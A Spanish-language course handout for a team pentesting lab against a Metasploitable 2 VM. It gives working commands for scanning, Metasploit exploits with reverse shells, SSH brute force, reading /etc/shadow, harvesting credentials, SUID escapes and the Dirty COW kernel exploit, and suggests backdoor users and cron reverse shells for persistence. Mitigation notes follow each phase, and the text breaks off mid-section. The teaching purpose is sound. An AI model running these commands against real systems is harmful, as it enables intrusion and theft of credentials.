|![](Aspose.Words.f2c0a3f5-2c2a-4913-87d4-d4f658549340.001.png)|**Ciberseguridad 202615**|
| :- | :- |

**Práctica Nro. 8**

**Escaneo de Vulnerabilidades y Explotación Avanzada (Enfoque de Ataque Integral en Equipo)**

**📋 INFORMACIÓN GENERAL**

**Contexto del Escenario**

Una empresa ficticia "TechCorp Solutions" ha contratado a su equipo de pentesting para realizar una auditoría de seguridad completa de su infraestructura. La empresa tiene varios servicios expuestos y sospecha que pueden tener vulnerabilidades críticas.

**Su equipo se dividirá en 5 grupos especializados**, cada uno responsable de una fase específica del ataque, pero **TODOS trabajarán en paralelo** sobre el mismo objetivo, documentando sus hallazgos para una presentación integrada final.

**Objetivos de Aprendizaje**

- Realizar reconocimiento y enumeración profesional
- Identificar y explotar vulnerabilidades específicas
- Mantener persistencia y escalar privilegios
- Extraer información sensible
- Documentar hallazgos de forma profesional
- Proponer remediaciones efectivas

**Requisitos Técnicos**

- **Kali Linux** (Atacante)
- **Metasploitable 2** (Objetivo)
- **Herramientas**: Nmap, Metasploit, Hydra, John the Ripper, Netcat
- **Conexión de red**: Ambas VMs en la misma red (NAT o Host-Only)
-----
**🎯 ESTRUCTURA DE EQUIPOS Y FASES**

**Visión Integral del Ataque**

EQUIPO 1: Reconocimiento → EQUIPO 2: Acceso Inicial → EQUIPO 3: Post-Explotación 

`    `↓                           ↓                            ↓

EQUIPO 4: Escalada ← ← ← ← EQUIPO 5: Exfiltración y Persistencia

**IMPORTANTE**: Cada equipo trabaja **independientemente** en su fase, pero al final unirán sus hallazgos para mostrar el **ciclo completo de un ataque APT** (Advanced Persistent Threat).

-----
**

**👥 EQUIPO 1: RECONOCIMIENTO Y ENUMERACIÓN**

**Fase: Intelligence Gathering**

**Objetivo**

Mapear completamente la superficie de ataque de TechCorp, identificando todos los servicios, versiones y posibles vectores de entrada.

**Escenario Específico**

Eres el equipo de **Reconocimiento Pasivo y Activo**. Tu trabajo es proporcionar al resto de equipos un mapa completo del objetivo sin levantar demasiadas alarmas.

-----
**📝 PROCEDIMIENTO PASO A PASO**

**Paso 1: Preparación del Entorno**

\# Verificar conectividad

sudo su

ip a  # Anotar tu IP

ping <IP\_METASPLOITABLE>  # Verificar conectividad

**Paso 2: Escaneo Inicial (Sigiloso)**

\# Escaneo de descubrimiento de hosts

nmap -sn 192.168.1.0/24  # Ajustar a tu red

\# Escaneo sigiloso de puertos

nmap -sS -p- --min-rate 1000 <IP\_METASPLOITABLE> -oN escaneo\_puertos.txt

\# Análisis de resultados

cat escaneo\_puertos.txt | grep "open"

**📊 Documenta**: ¿Cuántos puertos encontraste abiertos?

**Paso 3: Enumeración de Servicios y Versiones**

\# Escaneo detallado de servicios

nmap -sV -sC -p21,22,23,25,53,80,139,445,3306,5432,6667,8180 <IP\_METASPLOITABLE> -oN servicios\_detallados.txt

\# Visualizar resultados organizados

cat servicios\_detallados.txt

**Paso 4: Escaneo de Vulnerabilidades con Scripts NSE**

\# Escaneo con scripts de vulnerabilidades

nmap --script vuln -p21,22,23,25,80,139,445,3306,5432,6667 <IP\_METASPLOITABLE> -oN vulnerabilidades\_nse.txt

\# Escaneo específico con Vulners

nmap --script vulners -sV <IP\_METASPLOITABLE> -oN vulners\_scan.txt

\# Escaneo filtrado por severidad crítica

nmap -sV --script=vulners --script-args mincvss=7.0 <IP\_METASPLOITABLE> -oN vulners\_criticas.txt

**Paso 5: Enumeración Específica por Servicio**

**FTP (Puerto 21)**

nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor -p21 <IP\_METASPLOITABLE>

**SSH (Puerto 22)**

nmap --script ssh-hostkey,ssh-auth-methods -p22 <IP\_METASPLOITABLE>

**SMB (Puertos 139/445)**

nmap --script smb-vuln\* -p139,445 <IP\_METASPLOITABLE>

nmap --script smb-enum-shares,smb-enum-users -p445 <IP\_METASPLOITABLE>

**Web (Puerto 80)**

nmap --script http-enum,http-headers,http-methods,http-php-version -p80 <IP\_METASPLOITABLE>

**PostgreSQL (Puerto 5432)**

nmap --script pgsql-brute -p5432 <IP\_METASPLOITABLE>

**IRC (Puerto 6667)**

nmap --script irc-unrealircd-backdoor -p6667 <IP\_METASPLOITABLE>

**Paso 6: Creación de Matriz de Vulnerabilidades**

Crear un archivo llamado matriz\_vulnerabilidades.txt:

nano matriz\_vulnerabilidades.txt

Estructura sugerida:

=== MATRIZ DE VULNERABILIDADES - TECHCORP ===

Fecha: [FECHA]

Analista: Equipo 1

PUERTO | SERVICIO | VERSIÓN | VULNERABILIDAD | SEVERIDAD | CVE

\-------|----------|---------|----------------|-----------|-----

21     | FTP      | vsftpd 2.3.4 | Backdoor | CRÍTICA | CVE-2011-2523

22     | SSH      | OpenSSH 4.7p1 | Credenciales débiles | ALTA | N/A

139/445| SMB      | Samba 3.0.20 | RCE | CRÍTICA | CVE-2007-2447

3306   | MySQL    | 5.0.51a | Credenciales débiles | ALTA | N/A

5432   | PostgreSQL| 8.3.0 | Credenciales débiles | ALTA | N/A

6667   | IRC      | UnrealIRCd | Backdoor | CRÍTICA | CVE-2010-2075

VECTORES DE ATAQUE RECOMENDADOS:

1\. FTP vsftpd - Backdoor (Equipo 2)

2\. Samba - RCE (Equipo 2)

3\. UnrealIRCd - Backdoor (Equipo 2)

4\. Fuerza bruta SSH/PostgreSQL (Equipo 2)

5\. Web vulnerabilities (Equipo 3)

**Paso 7: Enumeración Web Adicional (Bonus)**

\# Si tienen tiempo, explorar la web

firefox http://<IP\_METASPLOITABLE> &

\# Enumerar directorios

dirb http://<IP\_METASPLOITABLE> /usr/share/wordlists/dirb/common.txt -o dirb\_results.txt

\# O con gobuster

gobuster dir -u http://<IP\_METASPLOITABLE> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster\_results.txt

-----
**📊 ENTREGABLES DEL EQUIPO 1**

1. **Reporte de Reconocimiento** (documento Word/PDF) que incluya:
   1. Metodología utilizada
   1. Puertos abiertos identificados
   1. Servicios y versiones detectadas
   1. Matriz de vulnerabilidades completa
   1. Top 5 vulnerabilidades críticas priorizadas
   1. Recomendaciones de vectores de ataque
1. **Archivos técnicos**:
   1. escaneo\_puertos.txt
   1. servicios\_detallados.txt
   1. vulnerabilidades\_nse.txt
   1. vulners\_scan.txt
   1. matriz\_vulnerabilidades.txt
1. **Presentación** (10-15 minutos):
   1. Explicar metodología de reconocimiento
   1. Mostrar hallazgos principales
   1. Demostrar comandos clave en vivo
   1. Entregar "inteligencia" al Equipo 2
-----
**🤔 PREGUNTAS DE REFLEXIÓN**

1. ¿Qué diferencias encontraste entre el escaneo con --script vuln y --script vulners?
1. ¿Por qué es importante el parámetro mincvss?
1. ¿Qué técnicas usarías para hacer el reconocimiento más sigiloso?
1. ¿Cómo detectaría un IDS/IPS estos escaneos?
1. ¿Qué información es más valiosa para los siguientes equipos?
-----
**

**🛡️ MEDIDAS DE MITIGACIÓN (Para incluir en conclusiones)**

1. **Implementar IDS/IPS** para detectar escaneos de puertos
1. **Rate limiting** en servicios expuestos
1. **Port knocking** para servicios críticos
1. **Actualizar servicios** a versiones sin vulnerabilidades conocidas
1. **Minimizar superficie de ataque** (cerrar puertos innecesarios)
1. **Implementar honeypots** para detectar reconocimiento
-----
**👥 EQUIPO 2: ACCESO INICIAL Y EXPLOTACIÓN**

**Fase: Initial Access & Exploitation**

**Objetivo**

Obtener acceso inicial al sistema objetivo explotando las vulnerabilidades identificadas por el Equipo 1, estableciendo múltiples puntos de entrada.

**Escenario Específico**

Eres el equipo de **Explotación**. Basándote en la inteligencia del Equipo 1, tu misión es comprometer el sistema usando al menos **3 vectores de ataque diferentes** y obtener shells remotas.

-----
**📝 PROCEDIMIENTO PASO A PASO**

**Preparación: Iniciar Metasploit**

sudo su

msfconsole

\# Comandos básicos útiles

msf6 > help

msf6 > search <término>

msf6 > use <exploit>

msf6 > show options

msf6 > set <parámetro> <valor>

msf6 > exploit

-----
**🎯 ATAQUE 1: Explotación de vsftpd 2.3.4 Backdoor**

**Contexto**

El servicio FTP vsftpd versión 2.3.4 contiene un backdoor malicioso que permite acceso remoto sin autenticación.

**Procedimiento**

msf6 > search vsftpd

\# Resultado esperado:

\# exploit/unix/ftp/vsftpd\_234\_backdoor

msf6 > use exploit/unix/ftp/vsftpd\_234\_backdoor

msf6 exploit(unix/ftp/vsftpd\_234\_backdoor) > info



\# Observar:

\# - Descripción del exploit

\# - Plataformas afectadas

\# - Targets disponibles

\# - Referencias (CVE)

msf6 exploit(unix/ftp/vsftpd\_234\_backdoor) > show options

\# Configurar parámetros

msf6 exploit(unix/ftp/vsftpd\_234\_backdoor) > set RHOSTS <IP\_METASPLOITABLE>

msf6 exploit(unix/ftp/vsftpd\_234\_backdoor) > set RPORT 21

\# Verificar payloads disponibles

msf6 exploit(unix/ftp/vsftpd\_234\_backdoor) > show payloads

\# Este exploit usa un payload específico

msf6 exploit(unix/ftp/vsftpd\_234\_backdoor) > set payload cmd/unix/interact

\# Verificar configuración final

msf6 exploit(unix/ftp/vsftpd\_234\_backdoor) > options

\# EJECUTAR EXPLOIT

msf6 exploit(unix/ftp/vsftpd\_234\_backdoor) > exploit

**Si tienes éxito:**

\# Deberías obtener una shell

whoami  # Verificar usuario (debería ser root)

id

uname -a

ifconfig

pwd

\# Explorar el sistema

ls -la /root

cat /etc/passwd

cat /etc/shadow

\# Guardar evidencia

whoami > /tmp/equipo2\_ftp\_access.txt

date >> /tmp/equipo2\_ftp\_access.txt
**\


**Documentar:**

- Screenshot de la shell obtenida
- Usuario con el que obtuviste acceso
- Comandos ejecutados
- Información recopilada
-----
**🎯 ATAQUE 2: Explotación de UnrealIRCd Backdoor**

**Contexto**

El servicio IRC UnrealIRCd tiene un backdoor que permite ejecución remota de código.

**Procedimiento**

\# Desde msfconsole (abre otra terminal si cerraste la anterior)

msf6 > search unrealircd

\# Resultado esperado:

\# exploit/unix/irc/unreal\_ircd\_3281\_backdoor

msf6 > use exploit/unix/irc/unreal\_ircd\_3281\_backdoor

msf6 exploit(unix/irc/unreal\_ircd\_3281\_backdoor) > info

\# Configurar

msf6 exploit(unix/irc/unreal\_ircd\_3281\_backdoor) > set RHOSTS <IP\_METASPLOITABLE>

msf6 exploit(unix/irc/unreal\_ircd\_3281\_backdoor) > set RPORT 6667

\# Ver payloads disponibles

msf6 exploit(unix/irc/unreal\_ircd\_3281\_backdoor) > show payloads

\# Seleccionar payload interactivo

msf6 exploit(unix/irc/unreal\_ircd\_3281\_backdoor) > set payload cmd/unix/reverse

\# Configurar LHOST (tu IP de Kali)

msf6 exploit(unix/irc/unreal\_ircd\_3281\_backdoor) > set LHOST <TU\_IP\_KALI>

\# Ejecutar

msf6 exploit(unix/irc/unreal\_ircd\_3281\_backdoor) > exploit

**Comandos post-explotación:**

\# Verificar acceso

whoami

id

hostname

\# Crear archivo de evidencia

echo "Acceso via UnrealIRCd - Equipo 2" > /tmp/equipo2\_irc\_access.txt

date >> /tmp/equipo2\_irc\_access.txt

whoami >> /tmp/equipo2\_irc\_access.txt

\# Explorar

ps aux | grep root

netstat -tulpn

-----
**🎯 ATAQUE 3: Explotación de Samba 3.0.20 (CVE-2007-2447)**

**Contexto**

Samba 3.0.20 tiene una vulnerabilidad de ejecución remota de comandos a través del campo username.

**Procedimiento**

msf6 > search samba 3.0.20

\# O más específico:

msf6 > search CVE-2007-2447

\# Resultado:

\# exploit/multi/samba/usermap\_script

msf6 > use exploit/multi/samba/usermap\_script

msf6 exploit(multi/samba/usermap\_script) > info

\# Configurar

msf6 exploit(multi/samba/usermap\_script) > set RHOSTS <IP\_METASPLOITABLE>

msf6 exploit(multi/samba/usermap\_script) > set RPORT 139

\# Ver payloads

msf6 exploit(multi/samba/usermap\_script) > show payloads

\# Seleccionar payload más potente

msf6 exploit(multi/samba/usermap\_script) > set payload cmd/unix/reverse\_netcat

msf6 exploit(multi/samba/usermap\_script) > set LHOST <TU\_IP\_KALI>

msf6 exploit(multi/samba/usermap\_script) > set LPORT 4444

\# Ejecutar

msf6 exploit(multi/samba/usermap\_script) > exploit
**\


**Comandos avanzados:**

\# Verificar privilegios

whoami  # Deberías ser root

id

\# Crear backdoor simple para Equipo 5

echo "Equipo 2 - Backdoor via Samba" > /tmp/equipo2\_samba\_access.txt

\# Guardar información del sistema

uname -a > /tmp/system\_info.txt

cat /etc/issue >> /tmp/system\_info.txt

ifconfig >> /tmp/system\_info.txt

\# Listar usuarios del sistema

cat /etc/passwd | grep -v "nologin" > /tmp/usuarios\_validos.txt

-----
**🎯 ATAQUE 4 (BONUS): Fuerza Bruta SSH**

**Contexto**

Si los backdoors fallan, siempre puedes intentar fuerza bruta contra servicios con credenciales débiles.

**Preparación de Diccionarios**

\# Crear archivo de usuarios comunes

cat > usuarios.txt << EOF

root

admin

msfadmin

user

postgres

service

EOF

\# Crear archivo de contraseñas comunes

cat > passwords.txt << EOF

root

admin

password

123456

msfadmin

postgres

service

EOF
**\


**Método 1: Con Metasploit**

msf6 > use auxiliary/scanner/ssh/ssh\_login

msf6 auxiliary(scanner/ssh/ssh\_login) > show options

msf6 auxiliary(scanner/ssh/ssh\_login) > set RHOSTS <IP\_METASPLOITABLE>

msf6 auxiliary(scanner/ssh/ssh\_login) > set USER\_FILE /root/usuarios.txt

msf6 auxiliary(scanner/ssh/ssh\_login) > set PASS\_FILE /root/passwords.txt

msf6 auxiliary(scanner/ssh/ssh\_login) > set VERBOSE true

msf6 auxiliary(scanner/ssh/ssh\_login) > run

**Método 2: Con Hydra (más rápido)**

\# Salir de msfconsole temporalmente

hydra -L usuarios.txt -P passwords.txt ssh://<IP\_METASPLOITABLE> -t 4 -V

\# Guardar resultados

hydra -L usuarios.txt -P passwords.txt ssh://<IP\_METASPLOITABLE> -t 4 -V -o hydra\_ssh\_results.txt

**Conectar con credenciales encontradas:**

ssh msfadmin@<IP\_METASPLOITABLE>

\# Password: msfadmin

\# Una vez dentro

whoami

echo "Acceso SSH - Equipo 2" > /tmp/equipo2\_ssh\_access.txt

-----
**📊 ENTREGABLES DEL EQUIPO 2**

1. **Reporte de Explotación** que incluya:
   1. Resumen ejecutivo de accesos obtenidos
   1. Detalle de cada exploit utilizado
   1. Screenshots de shells obtenidas
   1. Nivel de privilegios conseguido en cada caso
   1. Comandos ejecutados y resultados
   1. Archivos creados en el sistema objetivo
1. **Archivos técnicos**:
   1. hydra\_ssh\_results.txt (si aplicó)
   1. Screenshots de cada shell exitosa
   1. Logs de Metasploit (pueden exportarse)
1. **Presentación** (10-15 minutos):
   1. Demostrar EN VIVO al menos 2 exploits
   1. Explicar por qué funcionaron
   1. Mostrar nivel de acceso obtenido
   1. Entregar "accesos" documentados al Equipo 3
1. **Handoff al Equipo 3**:
   1. Lista de shells activas
   1. Credenciales encontradas
   1. Archivos creados en /tmp/
   1. Recomendaciones de qué explorar
-----
**🤔 PREGUNTAS DE REFLEXIÓN**

1. ¿Por qué algunos exploits requieren configurar LHOST y otros no?
1. ¿Qué diferencia hay entre cmd/unix/interact y cmd/unix/reverse?
1. ¿Con cuál exploit obtuviste privilegios de root directamente?
1. ¿Qué logs crees que dejaste en el sistema objetivo?
1. ¿Cómo podría un Blue Team detectar estos ataques?
-----
**🛡️ MEDIDAS DE MITIGACIÓN**

1. **vsftpd**: Actualizar a versión 2.3.5 o superior
1. **UnrealIRCd**: Actualizar a versión parcheada o cambiar a servicio alternativo
1. **Samba**: Actualizar a versión 3.0.25 o superior
1. **SSH**:
   1. Implementar políticas de contraseñas fuertes
   1. Deshabilitar autenticación por contraseña (usar llaves SSH)
   1. Implementar fail2ban
   1. Limitar intentos de login
1. **General**: Implementar segmentación de red y monitoreo de conexiones anómalas
-----
**

**👥 EQUIPO 3: POST-EXPLOTACIÓN Y ENUMERACIÓN INTERNA**

**Fase: Post-Exploitation & Internal Reconnaissance**

**Objetivo**

Una vez comprometido el sistema (gracias al Equipo 2), realizar enumeración interna profunda, recopilar información sensible, y preparar el terreno para escalada de privilegios y persistencia.

**Escenario Específico**

Eres el equipo de **Post-Explotación**. Ya tienes acceso al sistema. Ahora debes:

- Enumerar usuarios, procesos y configuraciones
- Buscar información sensible (contraseñas, bases de datos, archivos)
- Identificar vectores de escalada de privilegios
- Mapear la red interna
- Preparar información para los Equipos 4 y 5
-----

**📝 PROCEDIMIENTO PASO A PASO**

**Paso 1: Establecer Acceso Estable**

\# Opción A: Conectar via SSH con credenciales del Equipo 2

ssh msfadmin@<IP\_METASPLOITABLE>

\# Password: msfadmin

\# Opción B: Usar una de las shells del Equipo 2

\# (Replicar uno de los exploits anteriores)

**Paso 2: Enumeración Básica del Sistema**

\# Información del sistema

uname -a

cat /etc/issue

cat /etc/\*-release

hostname

date

\# Usuario actual y privilegios

whoami

id

groups

sudo -l  # ¿Puedes ejecutar algo como sudo?

\# Guardar información

mkdir -p /tmp/equipo3\_enum

echo "=== INFORMACIÓN DEL SISTEMA ===" > /tmp/equipo3\_enum/system\_info.txt

uname -a >> /tmp/equipo3\_enum/system\_info.txt

cat /etc/issue >> /tmp/equipo3\_enum/system\_info.txt

whoami >> /tmp/equipo3\_enum/system\_info.txt

id >> /tmp/equipo3\_enum/system\_info.txt

**Paso 3: Enumeración de Usuarios**

\# Listar todos los usuarios

cat /etc/passwd

cat /etc/passwd | grep -v "nologin" | grep -v "false"

\# Usuarios con shell válida

cat /etc/passwd | grep "/bin/bash" > /tmp/equipo3\_enum/usuarios\_bash.txt

\# Intentar ver shadow (si tienes privilegios)

cat /etc/shadow 2>/dev/null

\# Usuarios conectados

w

who

last | head -20

\# Archivos de usuarios

ls -la /home/

ls -la /home/msfadmin/

\# Buscar archivos de configuración con credenciales

find /home -name "\*.txt" 2>/dev/null

find /home -name "\*.conf" 2>/dev/null

find /home -name ".bash\_history" 2>/dev/null

\# Revisar historial de comandos

cat /home/msfadmin/.bash\_history 2>/dev/null

history

**Paso 4: Enumeración de Red Interna**

\# Configuración de red

ifconfig

ip a

ip route

\# Conexiones activas

netstat -tulpn

netstat -ano

\# Tabla ARP (otros hosts en la red)

arp -a

\# Archivos de configuración de red

cat /etc/hosts

cat /etc/resolv.conf

cat /etc/network/interfaces

\# Guardar información de red

ifconfig > /tmp/equipo3\_enum/network\_config.txt

netstat -tulpn >> /tmp/equipo3\_enum/network\_config.txt

arp -a >> /tmp/equipo3\_enum/network\_config.txt

**Paso 5: Enumeración de Procesos y Servicios**

\# Procesos en ejecución

ps aux

ps aux | grep root  # Procesos ejecutándose como root

\# Servicios activos

service --status-all

\# Puertos en escucha

netstat -tulpn | grep LISTEN

\# Tareas programadas (cron)

cat /etc/crontab

ls -la /etc/cron.\*

crontab -l 2>/dev/null

\# Guardar información de procesos

ps aux > /tmp/equipo3\_enum/processes.txt

netstat -tulpn > /tmp/equipo3\_enum/listening\_ports.txt

cat /etc/crontab > /tmp/equipo3\_enum/crontab.txt 2>/dev/null

**Paso 6: Búsqueda de Archivos Sensibles**

\# Archivos con contraseñas en el nombre

find / -name "\*password\*" 2>/dev/null

find / -name "\*passwd\*" 2>/dev/null

find / -name "\*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null

\# Archivos de configuración importantes

cat /etc/mysql/my.cnf 2>/dev/null

cat /var/www/html/config.php 2>/dev/null

cat /opt/lampp/etc/my.cnf 2>/dev/null

\# Buscar archivos con SUID (importante para escalada)

find / -perm -4000 -type f 2>/dev/null > /tmp/equipo3\_enum/suid\_files.txt

cat /tmp/equipo3\_enum/suid\_files.txt

\# Archivos con permisos de escritura para todos

find / -perm -2 -type f 2>/dev/null | grep -v "/proc"

\# Archivos modificados recientemente (últimas 24h)

find / -mtime -1 -type f 2>/dev/null | head -50

\# Guardar búsquedas

find / -name "\*password\*" 2>/dev/null > /tmp/equipo3\_enum/archivos\_password.txt

**Paso 7: Enumeración de Bases de Datos**

**MySQL**

\# Verificar si MySQL está corriendo

ps aux | grep mysql

netstat -tulpn | grep 3306

\# Intentar conectar (probar credenciales comunes)

mysql -u root -p

\# Probar: root, admin, password, (vacío)

\# Si logras entrar:

mysql -u root -p

mysql> show databases;

mysql> use mysql;

mysql> select user,password from user;

mysql> \q

\# Guardar información

mysql -u root -e "show databases;" > /tmp/equipo3\_enum/mysql\_databases.txt 2>/dev/null

**PostgreSQL**

\# Verificar PostgreSQL

ps aux | grep postgres

netstat -tulpn | grep 5432

\# Intentar conectar

psql -U postgres

\# Password común: postgres

\# Dentro de psql:

\l  # Listar bases de datos

\du  # Listar usuarios

\q

\# Guardar información

psql -U postgres -c "\l" > /tmp/equipo3\_enum/postgres\_databases.txt 2>/dev/null

**Paso 8: Enumeración Web**

\# Explorar directorio web

ls -la /var/www/

ls -la /var/www/html/

\# Buscar archivos PHP interesantes

find /var/www -name "\*.php" -type f 2>/dev/null

\# Revisar archivos de configuración

cat /var/www/html/index.php 2>/dev/null

find /var/www -name "config.php" -exec cat {} \; 2>/dev/null

\# Buscar credenciales en archivos web

grep -r "password" /var/www/ 2>/dev/null | head -20

grep -r "mysql" /var/www/ 2>/dev/null | head -20

\# Listar aplicaciones web disponibles

ls -la /var/www/html/

**Paso 9: Enumeración de Aplicaciones Vulnerables**

\# Versiones de software instalado

dpkg -l | grep -i apache

dpkg -l | grep -i php

dpkg -l | grep -i mysql

dpkg -l | grep -i postgresql

\# Guardar lista completa de paquetes

dpkg -l > /tmp/equipo3\_enum/installed\_packages.txt

\# Buscar aplicaciones web conocidas

ls -la /var/www/html/ | grep -E "dvwa|mutillidae|wordpress|joomla"

**Paso 10: Recopilación de Credenciales**

\# Crear archivo consolidado de credenciales encontradas

cat > /tmp/equipo3\_enum/credenciales\_encontradas.txt << EOF

=== CREDENCIALES ENCONTRADAS - EQUIPO 3 ===

SSH:

\- Usuario: msfadmin / Password: msfadmin

MySQL:

\- Usuario: root / Password: (vacío o root)

PostgreSQL:

\- Usuario: postgres / Password: postgres

FTP:

\- Usuario: msfadmin / Password: msfadmin

OTROS:

[Agregar cualquier otra credencial encontrada]

EOF

\# Intentar extraer hashes de contraseñas

cat /etc/shadow > /tmp/equipo3\_enum/shadow\_hashes.txt 2>/dev/null

**Paso 11: Preparar Información para Equipo 4 (Escalada)**

\# Crear reporte de vectores de escalada

cat > /tmp/equipo3\_enum/vectores\_escalada.txt << EOF

=== VECTORES POTENCIALES DE ESCALADA - PARA EQUIPO 4 ===

1\. ARCHIVOS SUID:

$(cat /tmp/equipo3\_enum/suid\_files.txt)

2\. SUDO PERMISSIONS:

$(sudo -l 2>/dev/null)

3\. KERNEL VERSION:

$(uname -a)

4\. SERVICIOS COMO ROOT:

$(ps aux | grep root | head -10)

5\. TAREAS CRON:

$(cat /etc/crontab 2>/dev/null)

6\. ARCHIVOS ESCRIBIBLES:

$(find / -writable -type f 2>/dev/null | grep -v "/proc" | head -20)

RECOMENDACIONES:

\- Buscar exploits para kernel: $(uname -r)

\- Revisar permisos de archivos SUID

\- Analizar tareas cron modificables

\- Buscar servicios mal configurados

EOF

**Paso 12: Preparar Información para Equipo 5 (Persistencia)**

\# Crear reporte de puntos de persistencia

cat > /tmp/equipo3\_enum/puntos\_persistencia.txt << EOF

=== PUNTOS DE PERSISTENCIA IDENTIFICADOS - PARA EQUIPO 5 ===

1\. USUARIOS CON SHELL:

$(cat /tmp/equipo3\_enum/usuarios\_bash.txt)

2\. SERVICIOS REINICIABLES:

\- SSH (puerto 22)

\- MySQL (puerto 3306)

\- PostgreSQL (puerto 5432)

\- Apache (puerto 80)

3\. DIRECTORIOS ESCRIBIBLES:

\- /tmp

\- /var/tmp

\- /home/msfadmin

4\. TAREAS CRON MODIFICABLES:

$(ls -la /etc/cron.\* 2>/dev/null)

5\. SCRIPTS DE INICIO:

$(ls -la /etc/init.d/ 2>/dev/null | head -10)

RECOMENDACIONES:

\- Crear usuario backdoor

\- Modificar crontab para reverse shell

\- Agregar llave SSH en authorized\_keys

\- Modificar script de inicio

\- Instalar rootkit simple

EOF

-----
**📊 ENTREGABLES DEL EQUIPO 3**

1. **Reporte de Post-Explotación** que incluya:
   1. Resumen ejecutivo de información recopilada
   1. Mapa de usuarios y privilegios
   1. Diagrama de red interna
   1. Lista de servicios y versiones
   1. Credenciales encontradas
   1. Bases de datos identificadas
   1. Archivos sensibles localizados
   1. Vectores de escalada identificados
   1. Puntos de persistencia potenciales
1. **Archivos técnicos** (todos en /tmp/equipo3\_enum/):
   1. system\_info.txt
   1. usuarios\_bash.txt
   1. network\_config.txt
   1. processes.txt
   1. listening\_ports.txt
   1. suid\_files.txt
   1. archivos\_password.txt
   1. mysql\_databases.txt
   1. postgres\_databases.txt
   1. installed\_packages.txt
   1. credenciales\_encontradas.txt
   1. vectores\_escalada.txt
   1. puntos\_persistencia.txt
1. **Presentación** (10-15 minutos):
   1. Demostrar proceso de enumeración
   1. Mostrar información más crítica encontrada
   1. Explicar vectores de ataque identificados
   1. Entregar documentación a Equipos 4 y 5
1. **Handoff**:
   1. **Al Equipo 4**: vectores\_escalada.txt y archivos SUID
   1. **Al Equipo 5**: puntos\_persistencia.txt y credenciales
-----
**🤔 PREGUNTAS DE REFLEXIÓN**

1. ¿Qué información fue más valiosa para futuros ataques?
1. ¿Qué archivos SUID podrían ser explotados?
1. ¿Cómo podrías automatizar esta enumeración?
1. ¿Qué rastros dejaste durante la enumeración?
1. ¿Cómo detectaría un SOC esta actividad?
-----
**🛡️ MEDIDAS DE MITIGACIÓN**

1. **Principio de mínimo privilegio**: Limitar permisos de usuarios
1. **Auditoría de archivos SUID**: Revisar y remover innecesarios
1. **Hardening de bases de datos**: Credenciales fuertes, acceso limitado
1. **Monitoreo de comandos**: Implementar auditd para registrar comandos ejecutados
1. **Segmentación**: Limitar qué puede ver/acceder cada usuario
1. **Cifrado**: Cifrar datos sensibles en reposo
1. **File Integrity Monitoring (FIM)**: Detectar cambios en archivos críticos
-----
**

**👥 EQUIPO 4: ESCALADA DE PRIVILEGIOS**

**Fase: Privilege Escalation**

**Objetivo**

Escalar privilegios desde el usuario comprometido (msfadmin) hasta obtener acceso root completo, utilizando múltiples técnicas y vectores identificados por el Equipo 3.

**Escenario Específico**

Eres el equipo de **Escalada de Privilegios**. Tienes acceso como usuario limitado. Tu misión es convertirte en root usando al menos **3 técnicas diferentes**.

-----
**📝 PROCEDIMIENTO PASO A PASO**

**Preparación: Establecer Acceso**

\# Conectar como msfadmin

ssh msfadmin@<IP\_METASPLOITABLE>

\# Password: msfadmin

\# Verificar usuario actual

whoami  # Debería mostrar: msfadmin

id

\# Crear directorio de trabajo

mkdir -p /tmp/equipo4\_privesc

cd /tmp/equipo4\_privesc

-----
**🎯 TÉCNICA 1: Explotación de Binarios SUID**

**Contexto**

Los archivos con bit SUID se ejecutan con los permisos del propietario (generalmente root), no del usuario que los ejecuta.

**Paso 1: Identificar Binarios SUID**

\# Buscar archivos SUID

find / -perm -4000 -type f 2>/dev/null > suid\_binaries.txt

cat suid\_binaries.txt

\# Buscar binarios SUID específicos explotables

find / -perm -4000 -type f 2>/dev/null | grep -E "nmap|vim|find|bash|more|less|nano|cp"

**Paso 2: Explotar nmap (si está con SUID)**

\# Verificar si nmap tiene SUID

ls -la /usr/bin/nmap

\# Versiones antiguas de nmap tienen modo interactivo

nmap --interactive

nmap> !sh

\# Ahora deberías tener una shell como root

\# Verificar

whoami  # Debería mostrar: root

id

\# Crear evidencia

echo "Root via nmap SUID - Equipo 4" > /root/equipo4\_nmap\_root.txt

**Paso 3: Explotar otros binarios SUID comunes**

**find con SUID:**

\# Si find tiene SUID

find /home -exec /bin/sh \; -quit

**vim con SUID:**

\# Si vim tiene SUID

vim -c ':!/bin/sh'

**bash con SUID:**

\# Si bash tiene SUID

/bin/bash -p

-----
**🎯 TÉCNICA 2: Explotación del Kernel**

**Contexto**

Kernels antiguos tienen vulnerabilidades conocidas que permiten escalada de privilegios local.

**Paso 1: Identificar Versión del Kernel**

uname -a

cat /etc/issue

cat /proc/version

\# Guardar información

uname -a > /tmp/equipo4\_privesc/kernel\_info.txt

**Paso 2: Buscar Exploits Conocidos**

\# Desde Kali (otra terminal)

searchsploit linux kernel 2.6 privilege escalation

searchsploit linux kernel 2.6.24

\# Ejemplo: Dirty COW (CVE-2016-5195) - funciona en muchos kernels

searchsploit dirty cow

**Paso 3: Usar Exploit Pre-compilado (Ejemplo: Dirty COW)**

\# En Kali, descargar exploit

searchsploit -m 40839

\# O descargar manualmente

cd /tmp

wget https://www.exploit-db.com/download/40839 -O dirtycow.c

\# Transferir a Metasploitable

\# Opción A: Levantar servidor web en Kali

python3 -m http.server 8000

\# En Metasploitable, descargar

cd /tmp/equipo4\_privesc

wget http://<IP\_KALI>:8000/dirtycow.c

\# Opción B: Usar SCP

\# En Kali:

scp dirtycow.c msfadmin@<IP\_METASPLOITABLE>:/tmp/equipo4\_privesc/

**Paso 4: Compilar y Ejecutar Exploit**

\# En Metasploitable

cd /tmp/equipo4\_privesc

\# Compilar

gcc -pthread dirtycow.c -o dirtycow -lcrypt

\# Ejecutar (CUIDADO: puede desestabilizar el sistema)

./dirtycow

\# Seguir instrucciones del exploit

\# Generalmente crea un nuevo usuario con UID 0

\# Verificar

su firefart  # O el usuario que creó el exploit

\# Password: (la que configuraste)

whoami  # Debería ser root

id

\# Crear evidencia

echo "Root via Dirty COW - Equipo 4" > /root/equipo4\_dirtycow\_root.txt

**NOTA IMPORTANTE**: Dirty COW puede ser destructivo. En un entorno de producción, usa con extrema precaución. Para esta práctica, asegúrate de tener snapshots de tus VMs.

-----
**

**🎯 TÉCNICA 3: Explotación de Sudo Mal Configurado**

**Paso 1: Verificar Permisos Sudo**

sudo -l

\# Buscar comandos que puedas ejecutar como root

\# Ejemplo de salida:

\# User msfadmin may run the following commands:

